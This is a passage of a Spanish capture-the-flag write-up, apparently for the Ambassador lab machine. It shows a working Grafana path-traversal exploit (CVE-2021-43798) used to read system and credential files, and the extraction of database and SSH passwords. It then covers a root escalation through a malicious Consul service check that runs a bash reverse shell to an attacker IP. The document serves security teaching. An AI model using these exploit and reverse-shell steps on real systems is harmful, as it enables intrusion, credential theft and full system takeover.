	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-f'</span><span class="p">,</span> <span class="s">'--file'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'File name to read'</span><span class="p">)</span>

	<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

	<span class="n">make_request</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
</pre></table></code></div></div><p>Ahora intentamos leer el archivo <em>/etc/passwd</em> y lo conseguimos:</p><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre>❯ python3 CVE-2021-43798.py <span class="nt">-t</span> <span class="s1">'http://10.10.11.183:3000'</span> <span class="nt">-f</span> <span class="s1">'/etc/passwd'</span>

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
grafana:x:113:118::/usr/share/grafana:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
consul:x:997:997::/home/consul:/bin/false
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Aquí tienes un articulo que estudia a detalle la vulnerabilidad anterior: <a href="https://j0vsec.com/post/cve-2021-43798/">https://j0vsec.com/post/cve-2021-43798/</a></p></div></blockquote><p>Ya que podemos leer archivos, nuestro siguiente paso es <strong>buscar archivos interesantes sobre cualquier aplicación del sistema</strong>. Y ya que nuestro objetivo fue <code class="language-plaintext highlighter-rouge">Grafana</code>, ahora podemos buscar archivos de configuración que contengan datos importantes:</p><blockquote><p><a href="https://docs.huihoo.com/grafana/2.6/installation/configuration/index.html">Grafana Configuration</a></p></blockquote><p><img data-src="/assets/img/htb/writeups/ambassador/grafana_conf_info.png" alt="grafana config doc" class="shadow" data-proofer-ignore></p><p>Obtenemos la ruta del archivo de configuración y lo logramos extraer:</p><div class="language-ini highlighter-rouge"><div class="code-header"> <span data-label-text="Ini"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="c">##################### Grafana Configuration Example #####################
#
# Everything has defaults so you only need to uncomment things you want to
# change
</span>
<span class="c"># possible values : production, development
;app_mode = production
</span>
<span class="c"># instance name, defaults to HOSTNAME environment variable value or hostname if HOSTNAME var is empty
;instance_name = ${HOSTNAME}
</span>
<span class="err">...</span>
</pre></table></code></div></div><p>Examinando el archivo encontramos en la sección de <strong>Paths</strong> lo siguiente:</p><div class="language-ini highlighter-rouge"><div class="code-header"> <span data-label-text="Ini"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="err">...</span>

<span class="c">#################################### Paths ####################################
</span><span class="nn">[paths]</span>
<span class="c"># Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used)
;data = /var/lib/grafana
</span>
<span class="err">...</span>
</pre></table></code></div></div><p>Una ruta donde se almacenan archivos interesantes, solo nos faltaria un nombre, el cúal encontramos en la sección <strong>Database</strong>:</p><div class="language-ini highlighter-rouge"><div class="code-header"> <span data-label-text="Ini"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="err">...</span>

<span class="c">#################################### Database ####################################
</span><span class="nn">[database]</span>

<span class="err">...</span>

<span class="c"># For "sqlite3" only, path relative to data_path setting
;path = grafana.db
</span>
<span class="err">...</span>
</pre></table></code></div></div><p>Lo tenemos, ahora intentamos descargar el archivo <code class="language-plaintext highlighter-rouge">/var/lib/grafana/grafana.db</code>:</p><blockquote><p>Usando <code class="language-plaintext highlighter-rouge">curl</code></p></blockquote><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>❯ curl <span class="nt">--path-as-is</span> http://10.10.11.183:3000/public/plugins/mysql/../../../../../../../../var/lib/grafana/grafana.db <span class="nt">-O</span>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  644k  100  644k    0     0   807k      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:--  807k

❯ file grafana.db
grafana.db: SQLite 3.x database, last written using SQLite version 3035004, file counter 558, database pages 161, cookie 0x119, schema 4, UTF-8, version-valid-for 558
</pre></table></code></div></div><p>Ahora usamos el comando <code class="language-plaintext highlighter-rouge">sqlite3</code> para enumerar la base de datos <code class="language-plaintext highlighter-rouge">grafana.db</code>:</p><blockquote><p>List tables</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="go">❯ sqlite3 grafana.db
SQLite version 3.39.4 2022-09-29 15:55:41
Enter ".help" for usage hints.
</span><span class="gp">sqlite&gt;</span><span class="w"> </span>.tables
<span class="go">alert                       login_attempt             
alert_configuration         migration_log             
alert_instance              ngalert_configuration     
alert_notification          org                       
alert_notification_state    org_user                  
alert_rule                  playlist                  
alert_rule_tag              playlist_item             
alert_rule_version          plugin_setting            
annotation                  preferences               
annotation_tag              quota                     
api_key                     server_lock               
cache_data                  session                   
dashboard                   short_url                 
dashboard_acl               star                      
dashboard_provisioning      tag                       
dashboard_snapshot          team                      
dashboard_tag               team_member               
dashboard_version           temp_user                 
data_source                 test_data                 
kv_store                    user                      
library_element             user_auth                 
library_element_connection  user_auth_token
</span></pre></table></code></div></div><blockquote><p>Enumerate table schema</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="gp">sqlite&gt;</span><span class="w"> </span>.schema data_source 
<span class="go">CREATE TABLE `data_source` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL
, `org_id` INTEGER NOT NULL
, `version` INTEGER NOT NULL
, `type` TEXT NOT NULL
, `name` TEXT NOT NULL
, `access` TEXT NOT NULL
, `url` TEXT NOT NULL
, `password` TEXT NULL
, `user` TEXT NULL
, `database` TEXT NULL
, `basic_auth` INTEGER NOT NULL
, `basic_auth_user` TEXT NULL
, `basic_auth_password` TEXT NULL
, `is_default` INTEGER NOT NULL
, `json_data` TEXT NULL
, `created` DATETIME NOT NULL
, `updated` DATETIME NOT NULL
</span><span class="gp">, `with_credentials` INTEGER NOT NULL DEFAULT 0, `secure_json_data` TEXT NULL, `read_only` INTEGER NULL, `uid` TEXT NOT NULL DEFAULT 0);</span><span class="w">
</span><span class="gp">CREATE INDEX `IDX_data_source_org_id` ON `data_source` (`org_id`);</span><span class="w">
</span><span class="gp">CREATE UNIQUE INDEX `UQE_data_source_org_id_name` ON `data_source` (`org_id`,`name`);</span><span class="w">
</span><span class="gp">CREATE UNIQUE INDEX `UQE_data_source_org_id_uid` ON `data_source` (`org_id`,`uid`);</span><span class="w">
</span><span class="gp">CREATE INDEX `IDX_data_source_org_id_is_default` ON `data_source` (`org_id`,`is_default`);</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>DataSource is a name given to the connection set up to a database from a server</p></div></blockquote><blockquote><p>Extract database credentials</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">sqlite&gt;</span><span class="w"> </span>.mode column
<span class="gp">sqlite&gt;</span><span class="w"> </span>.header on
<span class="gp">sqlite&gt;</span><span class="w"> </span>SELECT user, password, database FROM data_source<span class="p">;</span>
<span class="go">user     password                    database
-------  --------------------------  --------
grafana  dontStandSoCloseToMe63221!  grafana
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Aquí puedes encontrar algunos comandos básicos de <code class="language-plaintext highlighter-rouge">SQLite</code>: <a href="https://www.sqlitetutorial.net/sqlite-commands/">https://www.sqlitetutorial.net/sqlite-commands/</a></p></div></blockquote><p>Con estas credenciales nos conectamos a la base de datos que enumeramos anteriormente con <code class="language-plaintext highlighter-rouge">nmap</code>, y extraemos las credenciales del usuario <code class="language-plaintext highlighter-rouge">developer</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre><td class="rouge-code"><pre><span class="go">❯ mysql -h '10.10.11.183' -u 'grafana' -p grafana
Enter password:       
</span><span class="gp">Welcome to the MariaDB monitor.  Commands end with ;</span><span class="w"> </span>or <span class="se">\g</span><span class="nb">.</span>
<span class="go">Your MySQL connection id is 66
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)
                                              
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

</span><span class="gp">Type 'help;</span><span class="s1">' or '</span><span class="se">\h</span><span class="s1">' for help. Type '</span><span class="se">\c</span><span class="s1">' to clear the current input statement.
</span><span class="go">                                                                                             
</span><span class="gp">MySQL [grafana]&gt;</span><span class="w"> </span>show schemas<span class="p">;</span>                                                               
<span class="go">+--------------------+
| Database           |
+--------------------+            
| grafana            |    
| information_schema |    
| mysql              |    
| performance_schema |    
| sys                |    
| whackywidget       |  
+--------------------+
6 rows in set (0.112 sec)                                                                                                                             
                                                                                             
</span><span class="gp">MySQL [grafana]&gt;</span><span class="w"> </span>use whackywidget<span class="p">;</span>                                                           
<span class="go">Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
                                                                                             
Database changed        
</span><span class="gp">MySQL [whackywidget]&gt;</span><span class="w"> </span>show tables<span class="p">;</span>
<span class="go">+------------------------+                                                                                                                                                                 
| Tables_in_whackywidget |                  
+------------------------+                  
| users                  |                  
+------------------------+               
1 row in set (0.105 sec)
                                              
</span><span class="gp">MySQL [whackywidget]&gt;</span><span class="w"> </span>SELECT <span class="k">*</span> FROM <span class="nb">users</span><span class="p">;</span>                                                    
<span class="go">+-----------+------------------------------------------+
| user      | pass                                     |         
+-----------+------------------------------------------+      
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+

</span><span class="gp">MySQL [whackywidget]&gt;</span><span class="w"> </span>SELECT user, FROM_BASE64<span class="o">(</span>pass<span class="o">)</span> FROM <span class="nb">users</span><span class="se">\G</span>
<span class="go">*************************** 1. row ***************************
             user: developer
FROM_BASE64(pass): anEnglishManInNewYork027468
</span></pre></table></code></div></div><p>Ahora recordamos el mensaje de antes sobre que podemos conectarnos por <strong>SSH</strong> como el usuario <code class="language-plaintext highlighter-rouge">developer</code> y conseguimos entrar al sistema:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="go">❯ ssh developer@10.10.11.183
The authenticity of host '10.10.11.183 (10.10.11.183)' can't be established.
ED25519 key fingerprint is SHA256:zXkkXkOCX9Wg6pcH1yaG4zCZd5J25Co9TrlNWyChdZk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.183' (ED25519) to the list of known hosts.
developer@10.10.11.183's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 23 Nov 2022 11:02:22 PM UTC

  System load:  0.02              Processes:             229
  Usage of /:   81.5% of 5.07GB   Users logged in:       0
  Memory usage: 55%               IPv4 address for eth0: 10.10.11.183
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Nov 23 20:53:34 2022 from 10.10.14.6
</span><span class="gp">developer@ambassador:~$</span><span class="w"> </span>find / <span class="nt">-name</span> user.txt <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-l</span> <span class="o">{}</span> + 2&gt;/dev/null
<span class="go">-rw-r----- 1 root developer 33 Nov 23 17:05 /home/developer/user.txt
</span></pre></table></code></div></div><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Después de una enumeración básica del sistema encontramos varios puertos abiertos de manera local:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="gp">developer@ambassador:~$</span><span class="w"> </span>netstat <span class="nt">-tulnp</span>
<span class="go">(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::3000                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:8301          0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:8302          0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:8600          0.0.0.0:*                           -
</span></pre></table></code></div></div><p>Usamos un poco de scripting en <code class="language-plaintext highlighter-rouge">bash</code> para comunicarnos con cada puerto:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="gp">developer@ambassador:~$</span><span class="w"> </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span>netstat <span class="nt">-tulnp</span> | <span class="nb">grep </span>127.0.0.1 | <span class="nb">awk</span> <span class="s1">'{print $4}'</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">':'</span> <span class="s1">'{print $2}'</span><span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">:</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> curl http://localhost:<span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
<span class="go">(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
8600:

curl: (52) Empty reply from server
33060:

curl: (1) Received HTTP/0.9 when not allowed

8300:

curl: (56) Recv failure: Connection reset by peer
8301:

curl: (52) Empty reply from server
8302:

curl: (52) Empty reply from server
8500:

Consul Agent: UI disabled. To enable, set ui_config.enabled=true in the agent configuration and restart.8301:

curl: (52) Empty reply from server
8302:

curl: (52) Empty reply from server
8600:

curl: (52) Empty reply from server
</span></pre></table></code></div></div><p>Solo conseguimos respuesta del puerto <strong>8500</strong> y menciona algo de <code class="language-plaintext highlighter-rouge">Consul</code>, buscando en internet encontramos lo siguiente:</p><blockquote><p><a href="https://www.consul.io/">Consul service</a></p></blockquote><p><img data-src="/assets/img/htb/writeups/ambassador/consul_mean.png" alt="Consul meaning" class="shadow" data-proofer-ignore></p><p>Ya que sabemos que <code class="language-plaintext highlighter-rouge">Consul</code> corre por detrás y no es la versión mas reciente, para informarnos más buscamos información en su <strong>Documentación</strong>:</p><blockquote><p><a href="https://developer.hashicorp.com/consul/api-docs/agent/service#register-service">Register Service</a> with Consul API</p></blockquote><p><img data-src="/assets/img/htb/writeups/ambassador/register_service.png" alt="Register service" class="shadow" data-proofer-ignore></p><p>Observamos que en la sección <code class="language-plaintext highlighter-rouge">Args</code> podemos ejecutar un archivo en intervalos de tiempo especificados. Pero que es ese archivo en <code class="language-plaintext highlighter-rouge">.json</code>?:</p><blockquote><p><a href="https://developer.hashicorp.com/consul/docs/discovery/services#register-services-with-service-definitions">Service Configuration</a></p></blockquote><p><img data-src="/assets/img/htb/writeups/ambassador/service_configuration.png" alt="Service configuration" class="shadow" data-proofer-ignore></p><p>Ahora creamos nuestros archivos:</p><blockquote><p><em>reverse.sh</em></p></blockquote><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

/bin/bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.155/1234 0&gt;&amp;1
</pre></table></code></div></div><blockquote><p><em>payload.json</em></p></blockquote><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"ID"</span><span class="p">:</span><span class="w"> </span><span class="s2">"marss_service"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"rce"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Tags"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"primary"</span><span class="p">,</span><span class="w"> </span><span class="s2">"v1"</span><span class="p">],</span><span class="w">
  </span><span class="nl">"Address"</span><span class="p">:</span><span class="w"> </span><span class="s2">"127.0.0.1"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Port"</span><span class="p">:</span><span class="w"> </span><span class="mi">80</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Check"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"DeregisterCriticalServiceAfter"</span><span class="p">:</span><span class="w"> </span><span class="s2">"90m"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Args"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"/tmp/.10.10.14.155/reverse.sh"</span><span class="p">],</span><span class="w">
    </span><span class="nl">"Interval"</span><span class="p">:</span><span class="w"> </span><span class="s2">"10s"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Timeout"</span><span class="p">:</span><span class="w"> </span><span class="s2">"86400s"</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>Ejecutamos el comando para subir nuestro servicio y nos aparece lo siguiente:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">developer@ambassador:/tmp/.10.10.14.155$</span><span class="w"> </span>curl <span class="nt">-X</span> PUT <span class="nt">--data</span> @payload.json <span class="se">\</span>
<span class="go">  http://localhost:8500/v1/agent/service/register?replace-existing-checks=true
Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' lacks permission 'service:write' on "redis"
</span></pre></table></code></div></div><p>Explorando más la documentación tenemos lo siguiente:</p><blockquote><p><a href="https://developer.hashicorp.com/consul/api-docs/api-structure">Consul Authentication</a></p></blockquote><p><img data-src="/assets/img/htb/writeups/ambassador/consul_token.png" alt="Consul auth" class="shadow" data-proofer-ignore></p><p>Entonces lo que nos falta es el <code class="language-plaintext highlighter-rouge">token</code> para poder realizar peticiones y así ejecutar nuestro servicio. Por ello, enumerando el sistema encontramos un repositorio <code class="language-plaintext highlighter-rouge">git</code> en el directorio <code class="language-plaintext highlighter-rouge">my-app</code> y revisando los cambios del último log encontramos el token:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="gp">developer@ambassador:/opt/my-app$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="go">total 24
drwxrwxr-x 5 root root 4096 Mar 13  2022 .
drwxr-xr-x 4 root root 4096 Sep  1 22:13 ..
drwxrwxr-x 4 root root 4096 Mar 13  2022 env
drwxrwxr-x 8 root root 4096 Mar 14  2022 .git
-rw-rw-r-- 1 root root 1838 Mar 13  2022 .gitignore
drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget
</span><span class="gp">developer@ambassador:/opt/my-app$</span><span class="w"> </span>git show
<span class="gp">commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt;</span><span class="w"> </span>main<span class="o">)</span>
<span class="gp">Author: Developer &lt;developer@ambassador.local&gt;</span><span class="w">
</span><span class="go">Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
</span><span class="gp"> #</span><span class="w"> </span>We use Consul <span class="k">for </span>application config <span class="k">in </span>production, this script will <span class="nb">help set </span>the correct values <span class="k">for </span>the app
<span class="gp">-#</span><span class="w"> </span>Export MYSQL_PASSWORD before running
<span class="gp">+#</span><span class="w"> </span>Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
<span class="go"> 
</span><span class="gp">-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $</span>MYSQL_PASSWORD
<span class="gp">+consul kv put whackywidget/db/mysql_pw $</span>MYSQL_PASSWORD
</pre></table></code></div></div><p>Ahora ejecutamos nuestro servicio, esperemos el <strong>intervalo</strong> establecido y se ejecutara nuestra <strong>Shell inversa</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="gp">developer@ambassador:/tmp/.10.10.14.155$</span><span class="w"> </span>curl <span class="nt">-X</span> PUT <span class="nt">--data</span> @payload.json <span class="se">\</span>
<span class="go">  -H 'X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5' \
  http://localhost:8500/v1/agent/service/register?replace-existing-checks=true
</span><span class="gp">developer@ambassador:/tmp/.10.10.14.155$</span><span class="w"> </span><span class="nb">chmod</span> +x reverse.sh 
<span class="gp">developer@ambassador:/tmp/.10.10.14.155$</span><span class="w"> 
</span><span class="go">
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ nc -lvnp 1234
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.11.183.
Ncat: Connection from 10.10.11.183:35370.
bash: cannot set terminal process group (29649): Inappropriate ioctl for device
bash: no job control in this shell
</span><span class="gp">root@ambassador:/#</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">whoami
root
